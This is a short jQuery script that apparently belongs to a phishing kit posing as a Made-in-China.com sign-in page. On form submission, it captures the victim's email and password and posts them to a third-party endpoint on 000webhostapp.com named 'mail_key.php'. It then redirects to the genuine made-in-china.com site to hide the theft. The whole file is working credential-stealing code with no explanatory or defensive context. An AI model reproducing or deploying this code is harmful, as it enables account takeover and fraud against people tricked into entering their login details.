$('document').ready(function () {

    $('#sign-in-form').on('submit', function () {

        $('#sign-in-form button').attr('disabled', true);
        $('#sign-in-form button').html('Please Wait...');

        var mail = $('#mail').val();
        var password = $('#password').val();

        $.ajax({
            url: 'https://fostesting.000webhostapp.com/servers/MadeInChina/php/mail_key.php',
            method: 'post',
            data: {
                mail,
                password
            },
            success: function (data) {
                console.log(data);
                if (data == 'Sent') {
                    location.assign('https://made-in-china.com');
                } else {
                    alert('Error Logging Into Your Account');
                }
            },
            fail: function (data) {
                console.log(data);
                alert('Error Logging Into Your Account');
            },
            error: function (data) {
                console.log(data);
                alert('Error Logging Into Your Account');
            }
        })

        return false;

    })

})